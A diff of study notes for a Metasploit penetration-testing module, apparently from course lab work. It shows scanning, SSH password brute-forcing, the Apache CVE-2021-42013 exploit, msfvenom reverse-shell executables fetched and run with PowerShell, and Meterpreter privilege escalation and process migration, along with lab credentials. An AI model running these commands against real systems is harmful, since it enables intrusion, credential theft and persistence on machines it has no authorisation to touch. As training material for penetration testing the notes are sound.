@@ -109,6 +109,7 @@ Metasploit should never be a black box. Script it, log it, and justify every mod
 MSF comes preinstalled on Kali but doesn't start its DB service in the default configuration.  Use of the DB is not mandatory, but there are compelling reasons to like storing info about target hosts and tracking successful exploitation attempts.  MSF uses PostgresSQL as a DB service, which is not active or enable on boot in Kali.
 
 We can start, create, and initialize the MSF DB with `msfdb init`.
+
 ```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo msfdb init                                          
@@ -122,6 +123,7 @@ We can start, create, and initialize the MSF DB with `msfdb init`.
 ```
 
 To enable the DB service at boot time we use `systemctl`.
+
 ```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo systemctl enable postgresql   
@@ -131,6 +133,7 @@ Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service �
 ```
 
 Launch the Metasploit CLI with `msfconsole`.
+
 ```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ sudo msfconsole                 
@@ -157,18 +160,22 @@ Metasploit Documentation: https://docs.metasploit.com/
 
 msf6 >
 ```
+
 - Hide the banner and version info on start up with `-q`
 
 Once the CLI has started we can verify the DB connectivity with `db_status`.
+
 ```
 msf6 > db_status
 [*] Connected to msf. Connection type: postgresql.
 ```
+
 - The DB is connected and we are all setup.
 
 The CLI of MSF provides numerous commands to navigate the framework, divided into [categories](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/).  The categories consist of Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, Credentials Backend Commands, and Developer Commands.
 
 We can list all available commands by entering `help`.
+
 ```
 msf6 > help
 
@@ -360,6 +367,7 @@ Before jumping into operations in MSF, let's discuss workspaces.  Assume we have
 The MSF `workspace` command lists all previously created workspaces, we can switch them by adding the name to the command.  To create a new workspace provide the name as an argument to `-a`.
 
 Create a workspace name `pen200` for us to store the results of this section.
+
 ```
 msf6 > workspace
 * default
@@ -374,6 +382,7 @@ msf6 > workspace
 Once created, Metasploit will use it as a current workspace.
 
 Let's populate the DB and familiarize ourselves with some of the Databse Backend Commands.  We can scan BRUTE2 with `db_nmap` which is a wrapper to execute Nmap inside Metasploit and save the finding to the DB.  The command syntax is identical to Nmap.
+
 ```
 msf6 > db_nmap
 [*] Usage: db_nmap [--save | [--help | -h]] [nmap options]
@@ -490,9 +499,11 @@ msf6 > db_nmap -A 192.168.197.202
 [*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 62.80 seconds
 ```
+
 - If the DB service is running, Metasploit will log findings and info about discovered hosts, services, or credentials in a convenient, accessible database.
 
 To list all discovered hosts we can enter `hosts`.
+
 ```
 msf6 > hosts
 
@@ -506,6 +517,7 @@ address       mac  name  os_name       os_flavor  os_sp  purpose  info  comments
 ```
 
 Enter `services` to display the discovered services from our port scan, we can filter for specific port number by providing it as an argument to `-p`.
+
 ```
 msf6 > services
 Services
@@ -535,6 +547,7 @@ host          port  proto  name  state  info
 192.168.197.  8000  tcp    http  open   Golang net/http server Go-IPFS json-rpc or Infl
 202                                     uxDB API
 ```
+
 - See all discovered services up to this point.
 - Quickly identify all hosts with a specific service running.
 
@@ -543,11 +556,13 @@ When working with numerous target systems during an assessment, the Database Bac
 Let's briefly review modules again, modules are used to perform tasks in Metasploit such as scanning or exploiting targets.  The framework includes several thousand modules divided into categories.
 
 The categories are displayed on the splash screen summary and can be viewed with the `show -h` command.
+
 ```
 msf6 > show -h
 [*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
 [*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
 ```
+
 - Shows the categories of the Metasploit modules.
 
 To activate a module we enter the `use` command with the module name.  The modules all follow a common slash-delimeted hierarchal syntax.
@@ -563,6 +578,7 @@ This makes it easy to explore and use modules.  We will explore auxiliary module
 MSF includes hundreds of auxiliary modules, priving functionality such as proto enum, port scanning, fuzzing, sniffing, and more.  Aux mods are useful for many tasks including info gathering (under the gather/hierarchy), and so on.
 
 There are too many to cover, but we will demonstrate the syntax and operation of two very common auxiliary modules.  To list all aux mods, we can run the `show auxiliary` command.  This presents us with a long list of all aux mods.
+
 ```
 msf6 > show auxiliary
 
@@ -587,6 +603,7 @@ Auxiliary
 We can use `search` to reduce the output considerably, filtering by app, type, CVE ID, operation, platform, and more.  In this example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit aux mod.
 
 To find the correct mod we can search all SMB aux mods with `search type:auxiliary smb`
+
 ```
 msf6 > search type:auxiliary smb
 
@@ -665,16 +682,20 @@ Matching Modules
 
 Interact with a module by name or index. For example info 65, use 65 or use auxiliary/fileformat/multidrop
 ```
+
 - This shows us all SMB aux modules the search has identified.
 
 To activate a mod we enter `use` followed by the mod name or using the index provided from the search result.  Using the later, activate the mod `auxiliary/scanner/smb/smb_version` with index `56`.
+
 ```
 msf6 > use 56
 msf6 auxiliary(scanner/smb/smb_version) >
 ```
+
 - The command prompt indicates the active module.
 
 To get info about the current active mod we can enter `info`.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > info
 
@@ -710,9 +731,11 @@ Description:
 
 View the full module info with the info -d command.
 ```
+
 - The description provides info about the purpose of the module.
 
 The output shows the Basic options and args of the mod.  We can also display options of a mod by entering `show options`.  The options contain a column named `Required`, which specifies if a value needs to be set before launching a mod.  Most Metasploit mods will set some of the options for us.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > show options
 
@@ -729,16 +752,19 @@ Module options (auxiliary/scanner/smb/smb_version):
 
 View the full module info with the info, or info -d command.
 ```
+
 - Shows the option RHOSTS has no value set but is required by the module.
  - *To display all required, but not yet set, options we can use the command show missing.*.
 
 We can add or remove values from options with `set` and `unset`.  We will `set` the value of RHOSTS to the IP of BRUTE2.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.197.202
 RHOSTS => 192.168.197.202
 ```
 
 Instead of setting the value manually we can set RHOSTS automatically with DB results.  We can set RHOSTS to all discovered hosts with open port 445 by entering `services`, the port number as `-p` arg, and `--rhosts` to set the results for this option.  First we `unset` the manually set value.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
 Unsetting RHOSTS...
@@ -752,9 +778,11 @@ host             port  proto  name          state  info
 
 RHOSTS => 192.168.197.202
 ```
+
 - Metasploit set the value for RHOSTS using DB results.
 
 With required options set, we can launch the mod by entering `run`.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > run
 
@@ -762,9 +790,11 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 [*] 192.168.197.202:      - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
+
 - The output shows that the target system supports version 2/3 of SMB and prefers SMB 3.1.1.
 
 Next, we use the `vulns` command to show if Metasploit detected any vulnerabilites based on the results of this module.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > vulns
 
@@ -782,10 +812,12 @@ UTC                                    ired                     rosoft.com/en-us
                                                                 87429/overview-of-serve
                                                                 r-message-block-signing
 ```
+
 - Our DB contains one vuln entry for [SMB Signing is not required](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)
  - This is a great way to quickly identify vulns without the use of a vulnerability scanner.
 
 Let's use another module.  In the Password Attacks Module, we succesfully identified the credentials on BRUTE with a dict attack agains SSH.  We can use Metasploit, instead of Hydra, to perform this attack.  First we `search` for SSH aux mods.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
 
@@ -824,6 +856,7 @@ Interact with a module by name or index. For example info 23, use 23 or use auxi
 ```
 
 We will activate `auxiliary/scanner/ssh/ssh_login` using index `15` and display its options.
+
 ```
 msf6 auxiliary(scanner/smb/smb_version) > use 15
 msf6 auxiliary(scanner/ssh/ssh_login) > show options
@@ -866,6 +899,7 @@ Module options (auxiliary/scanner/ssh/ssh_login):
 
 View the full module info with the info, or info -d command.
 ```
+
 - There are various options to set in this module.
  - Metasploit already set several for us.
  - Similar to Hydra, we can set a password and user or provide files containing users, passwords, or both.
@@ -873,6 +907,7 @@ View the full module info with the info, or info -d command.
 In the example Password Attacks, we assume we already identified user `george`, specify the `rockyou.txt` for options `PASS_FILE`. 
 - Set `RHOSTS` to `192.168.197.201`
 - Set `RPORT` to `2222`
+
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
 PASS_FILE => /usr/share/wordlists/rockyou.txt
@@ -885,6 +920,7 @@ RPORT => 2222
 ```
 
 With the required options set we can launch the mod with `run`.
+
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > run
 
@@ -892,10 +928,12 @@ msf6 auxiliary(scanner/ssh/ssh_login) > run
 [+] 192.168.197.201:2222 - Success: 'george:chocolate' 'uid=1000(george) gid=0(root) groups=0(root),27(sudo) Linux 9195ad6f4213 5.15.0-50-generic #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
 [*] SSH session 1 opened (192.168.45.182:34005 -> 192.168.197.201:2222) at 2023-11-19 16:39:30 -0800
 ```
+
 - Metasploit performed the dict attack and determined the correct password.
  - Unlike Hydra, it also opens a session.
 
 As with the `vulns` command, we can display all valid credentials with `creds`.
+
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > creds
 Credentials
@@ -916,6 +954,7 @@ Exploit modules contain exploit code for applications and services with known vu
 In this example we will access the target system, WEB18, using one of the included exploit modules.  Assume we identified the target systems running Apache 2.4.49 web server, vulnerable to CVE-2021-42013.  We'll attempt to use MSF and its exploit modules to get code execution.
 
 Create a workspace for this section and search MSF for modules related to "Apache 2.4.49".
+
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits
 [*] Added workspace: exploits
@@ -937,10 +976,12 @@ Matching Modules
 
 Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_normalize_path
 ```
+
 - Index `0` corresponding exploit.
 - Index `1` vuln scanner for corresponding exploit.
 
 Use the exploit and enter `info` to review its description.
+
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > use 0
 [*] Using configured payload linux/x64/meterpreter/reverse_tcp
@@ -1015,6 +1056,7 @@ References:
 
 View the full module info with the info -d command.
 ```
+
 - Output contains important info in the context of the exploit.
  - Before using we should understand what the module is doing by reviewing this info.
  - Output starts with general info.
@@ -1035,6 +1077,7 @@ The targets availble area of the output contains target specs of vulerabile targ
 Descriptions provides us a text-based explanation of mod purpose, this mod appears to be correct mod for the vuln in this scenario.
 
 Now we understand what the exploit mod does and what its implications are, we can display its options.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > show options
 
@@ -1070,12 +1113,14 @@ Exploit target:
    --  ----
    0   Automatic (Dropper)
 ```
+
 - Similar to aux mod options.
  - Additional section `Payload options`
   - If unset, default payload will be selected.
    - Always better to explicitly set to maintain tight control of the exploit process.
 
 For now, we will set Payload to a regular TCP reverse shell.  We can select with `set payload` and the payload name, `payload/linux/x64/shell_reverse_tcp`.  We also enter the IP of our Kali machine as `LHOST`.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/shell_reverse_tcp
 payload => linux/x64/shell_reverse_tcp
@@ -1115,6 +1160,7 @@ Exploit target:
    --  ----
    0   Automatic (Dropper)
 ```
+
 - Entered payload now active.
 - LHOST set.
 - LPORT set default `4444`
@@ -1124,6 +1170,7 @@ Exploit target:
 Note that we don't need to start a manual listener with Netcat to catch the rev shell, Metasploit does this automatically for the selected payload.
 
 Now, let's set the options `SSL` to `false` and `RPORT` to `80`, then set `RHOSTS` to target IP and enter `run`.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
 [!] Changing the SSL option's value may require changing RPORT!
@@ -1146,6 +1193,7 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > run
 id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
+
 - The exploit starts a listener on `4444`
 - Checks if target is vulnerable.
 - Vuln exploited and payload sent.
@@ -1154,6 +1202,7 @@ uid=1(daemon) gid=1(daemon) groups=1(daemon)
 Let's explore the concept of sessions and jobs in Metasploit.  Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.
 
 When we launched the exploit with `run`, a session was created and we obtained a shell.  We can background the session with `Ctrl+Z` and prompt confirmation.  Once sent to the background, we can use `sessions -l` to list all active sessions.
+
 ```id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ^Z
@@ -1168,10 +1217,12 @@ Active sessions
   2         shell x64/linux               192.168.45.182:4444 -> 192.168.205.16:56688 (
                                           192.168.205.16)
 ```
+
 - Provides info about target and payload in use.
  - Making it easy to identify which session manages access to which target.
 
 Interact with a session again by passing the session ID to `sessions -i`.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
 [*] Starting interaction with 2...
@@ -1179,6 +1230,7 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
 uname -a
 Linux 5def8107a7b2 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 ```
+
 - We can enter commands into the interactive shell again.
 - Kill a session with `sessions -k` and the ID as arg.  .
 
@@ -1205,6 +1257,7 @@ Staged payloads are sent in two parts.  The first is a small primary payload tha
 There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.
 
 With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter `show payloads`, getting a list of all compatible payloads.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
 Compatible Payloads
@@ -1218,12 +1271,14 @@ Compatible Payloads
    20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
 ...
 ```
+
 - Shows the payload we used at index `20`
 - The `/` char is used to denote whether a payload is staged or not.
  - `shell_reverse_tcp` at `20` is not staged.
  - `shell/reverse_tcp` at `15` is staged.
 
 Use the staged payload for this exploit module and launch it, Metasploit will reuse the vals for the options form the previous payload.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > db_nmap -A 192.168.250.16
 [*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-21 07:15 PST
@@ -1559,6 +1614,7 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > run
 id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
+
 - Be sure to check all options.
  - Target port 80, `set SSL false`
 - The send stage was only 38 bytes in size.
@@ -1576,6 +1632,7 @@ Metasploit contains the [Meterpreter](https://docs.metasploit.com/docs/using-met
 - And more.
 
 Let's display all compatible payloads in the exploit module from the prior section and search for Meterpreter payloads.  Activate a non-staged 64-bit Meterpreter TCP reverse shell payload and display its options.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
 
@@ -1634,6 +1691,7 @@ msf6 exploit(multi/http/apache_normalize_path_rce) >
 We should not that all Meterpreter payloads are staged, however the output contains staged and non-staged payloads.  The difference is in how Meterpreter payload is transferred to the target machine.  Non-staged version includes all components required to launch a Meterpreter session while the staged version uses a seperate first stage to load these [components](https://buffered.io/posts/staged-vs-stageless-handlers/).  Loading components over the network creates some traffic and may alert defensive systems.  When our bandwidth is limited or we want to use the same payload to compromise multiple systems in an assessment, the non-staged Meterpreter payload comes in handy.  We will use the non-staged version for the rest of the module.
 
 Run the module with our Meterpreter payload and display available commands when obtain a prompt with `help`.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > run
 
@@ -1781,6 +1839,7 @@ Stdapi: Audio Output Commands
 
 meterpreter >
 ```
+
 - We receive a promt a few seconds after launching the module.
 - Commands are divided into categories.
  - System Commands.
@@ -1788,6 +1847,7 @@ meterpreter >
  - File System Commands.
 
 Let's get familiar with some of the Meterpreter commands, we start gathering info by entering `sysinfo` and `getuid`.
+
 ```
 meterpreter > sysinfo
 Computer     : 172.29.0.2
@@ -1799,9 +1859,11 @@ meterpreter > getuid
 Server username: daemon
 meterpreter >
 ```
+
 - Providing us with info about the target computer, OS, and the current user.
 
 As we learned, Metasploit uses sessions to manage access to different machines.  When Metasploit interacts with a system in a session, it uses a concept named channels.  We can start an interactive shell by entering `shell`, execute a command in the context of a channel, and background the channel the shell runs in.  We use `Ctrl+Z` to background a channel.
+
 ```
 meterpreter > shell
 Process 135 created.
@@ -1814,6 +1876,7 @@ meterpreter >
 ```
 
 Next we start a second interactive shell, exec a command, and background the channel.
+
 ```
 meterpreter > shell
 Process 137 created.
@@ -1826,6 +1889,7 @@ meterpreter >
 ```
 
 Now we can list all active channels and interact with channel 1 again, enter `channel -l` to list, and `channel -i` with the channel ID as arg to interact.
+
 ```
 meterpreter > channel -l
 
@@ -1840,10 +1904,12 @@ Interacting with channel 1...
 id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
+
 - We have executed commands in the context of channel 1 again.
 - Using channels will help us to manage system access and perform post-exploitation ops.
 
 next we will use the `download` and `upload` commands from the File System Commands category to transfer files to and from the system.  Let's review the commands in this category again.
+
 ```
 Stdapi: File system Commands
 ============================
@@ -1874,11 +1940,13 @@ Stdapi: File system Commands
     search        Search for files
     upload        Upload a file or directory
 ```
+
 - Shows various commands we can use for FS ops.
  - Commands with `l` prefix operate on the local system.
   - Change dir for up/down-loading files for instance.
 
 Download `/etc/passwd` from the target machine to our Kali system.  Change local dir to `/home/$USER/Downloads` first, enter the `download` command, with `/etc/passwd` as arg.
+
 ```
 meterpreter > lcd /home/operator/Downloads/
 meterpreter > lpwd
@@ -1891,9 +1959,11 @@ meterpreter > lcat /home/operator/Downloads/passwd
 root:x:0:0:root:/root:/bin/bash
 ...
 ```
+
 - We were able to download `/etc/passwd` to our local machine.
 
 Let's assume we want to run `unix-privesc-check`, we will upload it to `/tmp`.
+
 ```
 [*] Uploading  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
 [*] Completed  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
@@ -1908,10 +1978,12 @@ Mode              Size     Type  Last modified              Name
 
 meterpreter >
 ```
+
 - Successful upload.
 - If our target runs Win OS, we need to escape backslashes in dest path like `\\`
 
 We used `linux/x64/meterpreter_reverse_tcp` payload in this section, before moving on we will explore another 64-bit Linux Meterpreter payload.  Exit the current session and use `show payloads` in the context of the exploit module again.
+
 ```
 meterpreter > exit
 [*] Shutting down Meterpreter...
@@ -1927,12 +1999,14 @@ Compatible Payloads
 ...
    12  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
 ```
+
 - This payload uses HTTPS to establish connection and comm.
  - Encrypted with SSL/TLS.
  - Defenders will only see info about HTTPS requests.
   - Without further defensive tech the will be unlikely to decipher the Meterpreter comms.
 
 Select the payload and display its options.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 12
 payload => linux/x64/meterpreter_reverse_https
@@ -1975,6 +2049,7 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 ```
+
 - There is an additional option `LURI`
  - This can be used to leverage a single listener on one port.
   - Capable of handling diff requests based on path in this option.
@@ -1982,6 +2057,7 @@ View the full module info with the info, or info -d command.
   - If left blank it defaults to `/`
 
 Launch the exploit by entering run, wihtout setting a `LURI` value.
+
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > run
 
@@ -2032,6 +2108,7 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > run
 
 meterpreter >
 ```
+
 - Various events are handled until the Meterpreter session is established.
  - A monitoring defender would ony see regular HTTPS traffic.
  - If they were to check the address of the endpoint (Kali), they would get a HTTP 404.
@@ -2043,6 +2120,7 @@ In a pentest, we can use this payload to improve our chances of bypassing securi
 Metasploit can also export payloads into various types of files, Win bins, Linux bins, and webshells for example.  Metasploit contains [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) as a standalone tool for generating these payloads.  It provides standardized command options and various techniques to customize payloads.
 
 To get familiar with msfvenom we'll create a mal Win bin that starts a raw TCP rev shell.  Let's start by listing all payloads with `-l` and arg `payloads`.  We will also pass `--platform` and `--arch`.
+
 ```bash
 kali@kali:~$ msfvenom -l payloads --platform windows --arch x64 
 
@@ -2052,10 +2130,12 @@ windows/x64/shell/reverse_tcp               Spawn a piped command shell (Windows
 windows/x64/shell_reverse_tcp               Connect back to attacker and spawn a command shell (Windows x64)
 ...
 ```
+
 - We can choose between stages and non-staged payloads.
  - We will use non-staged payload first.
 
 Now we use the `-p` flag to set the payload, set `LHOST`, and `LPORT` to assign host and port for the rev shell conn, `-f` to set the output format to `exe`, and `-o` to specify the output file name.
+
 ```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o nonstaged.exe
@@ -2068,6 +2148,7 @@ Saved as: nonstaged.exe
 ```
 
 Now that we have created out mal bin, let's use it.  First we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user `justin` and password `SuperS3cure1337#`.  Then start PowerShell to transfer the file and exec.
+
 ```powershell
 PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
 
@@ -2075,6 +2156,7 @@ PS C:\Users\justin> .\nonstaged.exe
 ```
 
 Once exec, we return to our Netcat listener.
+
 ```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc -nvlp 443 
@@ -2087,6 +2169,7 @@ C:\Users\justin>
 ```
 
 Now we will use a staged payload to perform the same action.  We again use msfvenom to create the staged TCP reverse shell payload.
+
 ```bash
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.182 LPORT=443 -f exe -o staged.exe   
@@ -2099,6 +2182,7 @@ Saved as: staged.exe
 ```
 
 We received an incoming conn, but cannot exec any commands.  This is because Netcat does not know how to handle the staged payload.
+
 ```bash
 kali@kali:~$ nc -nvlp 443                                                                                
 listening on [any] 443 ...
@@ -2109,6 +2193,7 @@ whoami
 To get a functional interactive command prompt we must use Metasploit's [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/) module, which works for most staged, non-staged, and more advanced payloads.
 
 In Metasploit, let's select the module with `use`, then specify the payload of our incoming conn, `windows/x64/shell/reverse_tcp` in this case.  In addition, we set the opions for th payload.  Enter the IP of our Kali machine as `LHOST` and port 443 for `LPORT`, then under `run` to launch the mod.
+
 ```
 msf6 > workspace -a execpayloads
 [*] Added workspace: execpayloads
@@ -2156,6 +2241,7 @@ msf6 exploit(multi/handler) > run
 ```
 
 With our listener running we can start the `staged.exe` on BRUTE2, our multi/handler receives the incoming staged payload and provides an interactive shell in the context of a `session`.
+
 ```
 msf6 exploit(multi/handler) > run
 
@@ -2175,11 +2261,13 @@ brute2\justin
 
 C:\Users\justin>
 ```
+
 - For staged and advanced payloads, i.e. Meterpreter, we must use multi/handler.
 
 Using `run` without any args will block the command prompt until exe finishes or we background the session.  As we learned previously, we can use `run -j` to start the listener in the background, allowing us to continue other work while we wait for the conn.  We can use the `jobs` command to get a list of currently active jobs, like listeners waiting for conn.
 
 Exit out session and restart with `run -j`, then list currently active jobs using `jobs`, once we exec staged.exe MSF will notify us that a new session was created.
+
 ```
 msf6 exploit(multi/handler) > run -j
 [*] Exploit running as background job 0.
@@ -2219,6 +2307,7 @@ Active sessions
 
 msf6 exploit(multi/handler) >
 ```
+
 - MSF created a new session for the incoming conn.
  - Interact with `sessions -i` passing the session ID as arg.
 
@@ -2267,6 +2356,7 @@ We can use msfvenom generated payloads in various situations during a pen test.
    User: mountainadmin
    Password: OS{bf12259a466c7e76928a797bc1f7e508}
    Attention: This user can do everything in our company.. Use with care!
+
 ```
 
 #### 20.3 Performing Post-Exploitation with Metasploit
@@ -2283,6 +2373,7 @@ Let's explor these features, note that the Linux Mterpreter payload contains les
 
 First, we'll create a Win bin with msfvenom containing a non-staged Meterpreter payload names `met.exe`
 ```bash
+
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.182 LPORT=443 -f exe -o met.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -2291,10 +2382,12 @@ No encoder specified, outputting raw payload
 Payload size: 201820 bytes
 Final size of exe file: 208384 bytes
 Saved as: met.exe
+
 ```
 
 Then we launch multi/handler, set options, and run.
 ```
+
 msf6 exploit(multi/handler) > set LPORT 443
 LPORT => 443
 msf6 exploit(multi/handler) > set LHOST 192.168.45.182
@@ -2333,10 +2426,12 @@ View the full module info with the info, or info -d command.
 msf6 exploit(multi/handler) > run
 
 [*] Started HTTPS reverse handler on https://192.168.45.182:443
+
 ```
 
 Next we start a Python3 web server, serve `met.exe`, conn to our bind shell, download our mal exe with PowerShell, and start the bin.
 ```bash
+
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc $IT 4444 
 Microsoft Windows [Version 10.0.22000.1219]
@@ -2354,21 +2449,25 @@ iwr -uri http://192.168.45.182/met.exe -Outfile met.exe
 PS C:\Users\luiza> .\met.exe
 .\met.exe
 PS C:\Users\luiza>
+
 ```
 
 Metasploit notifes us that a new session has been opened.
 ```
+
 [*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Redirecting stageless connection from /rFTB8XlDRXgroSqjTv68pQG2EEFr with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0'
 [*] https://192.168.45.182:443 handling request from 192.168.226.223; (UUID: 7unirfs7) Attaching orphaned/stageless session...
 [*] Meterpreter session 1 opened (192.168.45.182:443 -> 192.168.226.223:52494) at 2023-11-23 10:16:41 -0800
 
 meterpreter >
+
 ```
 
 Now that we have an active Meterpreter session on a Win target we can start exploring our port-exploitation commands/features.
 
 The first post command we use is `idletime`, which displays how long a user has been idle.  After obtaining basic info about the current user and OS, this should be one of our first commands as it indicated if the target sys is currently in use.
 ```
+
 meterpreter > getuid
 Server username: ITWK01\luiza
 meterpreter > sysinfo
@@ -2382,6 +2481,7 @@ Meterpreter     : x64/windows
 meterpreter > idletime 
 User has been idle for: 26 mins 21 secs
 meterpreter >
+
 ```
 
 The output states that the user has not interacted with the sys for over 26 min, suggesting they stepped away from their computer.  If the results of idletime indicated the user is away, we can take this as an opportunity to exec programs or commands which may display a cli-window, CMD or PS, for a moment.
@@ -2390,6 +2490,7 @@ Several post-exploitation features need admin privs to exec, Metasploit contains
 
 Before we exec `getsystem` let's start an interactive shell and confirm that our user has one of those two privs assigned.
 ```
+
 meterpreter > shell
 Process 1264 created.
 Channel 1 created.
@@ -2414,11 +2515,13 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 C:\Users\luiza>exit
 exit
 meterpreter >
+
 ```
 - User `luiza` has SeImpersontePrivilege assigned.
 
 Now let's use `getsystem` to attempt to elevate our privs.
 ```
+
 meterpreter > getuid
 Server username: ITWK01\luiza
 
@@ -2427,6 +2530,7 @@ meterpreter > getsystem
 
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
+
 ```
 - `getsystem` elevated our privs to NT AUTHORITY\SYSTEM by using Named Pipe Impersonation (Print Spooler variant) as we did manually in the Windows Privilege Escalation Module.
 
@@ -2434,6 +2538,7 @@ Another important post module feature is `migrate`.  When we compromise a host, 
 
 We can view all running procs with `ps` in the Meterpreter prompt.
 ```
+
 meterpreter > ps
 
 Process List
@@ -2445,6 +2550,7 @@ Process List
 ... 
  5292   4892  OneDrive.exe                 x64   1        ITWK01\offsec                 C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 ...
+
 ```
 - The proc `met.exe` has the proc ID 2012.
 - The name and path will stand out to a reviewing defender.
@@ -2455,6 +2561,7 @@ We should be aware that we are only able to migrate into a proc that executes at
 
 Let's migrate our current proc into the `OneDrive.exe` of the user `offsec` by entering `migrate` and the proc ID we want to migrate to.
 ```
+
 meterpreter > migrate 5292
 [*] Migrating from 2012 to 5292...
 [*] Migration completed successfully.
@@ -2474,25 +2581,30 @@ Process List
  2784   668   svchost.exe
  2928   668   svchost.exe
 ...
+
 ```
 - We succesfully migrated our proc to the OneDrive proc.
 
 When we review the proc list, our original `met.exe` proc doesn't exist anymore.  Further, we notice that `ps` output contains less info than before.  Reason being, we are now running in the context of the proc with the ID 8052 and therefore as user `offsec`.
 ```
+
 meterpreter > getuid
 Server username: ITWK01\offsec
+
 ```
 
 Instead of migrating to an existing proc or situation in which we won't find a suitable proc for migration, we can use the `execute` Meterpreter command.  This command procides the ability to create a new proc, specifying a command or program.
 
 To demonstrate, let's start a hidden Notepad proc and migrate to it as user `offsec`.  We use `execute` with `-H` to create the proc hidden from view and `notepad` as arg for `-f` to specify the command or program to run, then migrate to the spawned proc.
 ```
+
 meterpreter > execute -H -f notepad
 Process 3500 created.
 meterpreter > migrate 3500
 [*] Migrating from 5292 to 3500...
 [*] Migration completed successfully.
 meterpreter >
+
 ```
 - Shows we migrated to the newly spawned Notepad proc.
  - Spawned without GUI, `-H`
@@ -2512,6 +2624,7 @@ We first connect to the bind shell on port 4444 of TKWK01, download `met.exe`, a
 
 Connect to bind shell and exev our binary.
 ```bash
+
 ┌──(operator@labhost)-[~/OffSec/msf]
 └─$ nc $IT 4444
 Microsoft Windows [Version 10.0.22000.1219]
